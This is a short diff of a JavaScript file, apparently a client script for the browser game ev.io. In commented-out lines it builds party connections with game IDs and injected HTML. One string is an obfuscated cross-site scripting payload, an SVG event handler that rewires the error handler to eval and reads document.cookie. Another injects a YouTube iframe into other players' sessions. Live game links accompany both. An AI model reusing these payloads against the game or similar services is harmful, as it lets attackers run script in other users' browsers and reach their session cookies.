@@ -95,6 +95,9 @@ let t = new LinkCommand();
 //   // LocalClanState
 
 // }
-// jank()
-// let s= new PartyConnection("fdf74083-f812-4437-924d-404e2321a76b","<svg onload=frames.onerror=eval;aipAPItag='documen';aipAPItag+='t.cookie);//';TypeError.prototype.name='=1;alert('+aipAPItag;crazysdk=1>")
+// jank()https://ev.io/?game=087f4744-1531-43c3-b4d7-e1a357f34136
+
+// https://ev.io/?game=ef165f7d-59e7-4ccd-adeb-002b30db3827
+// let s= new PartyConnection("087f4744-1531-43c3-b4d7-e1a357f34136","<svg onclick=frames.onerror=eval;aipAPItag='documen';aipAPItag+='t.cookie);//';TypeError.prototype.name='=1;alert('+aipAPItag;crazysdk=1>")
+// let s = new PartyConnection('ef165f7d-59e7-4ccd-adeb-002b30db3827','<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>');
 export default t;
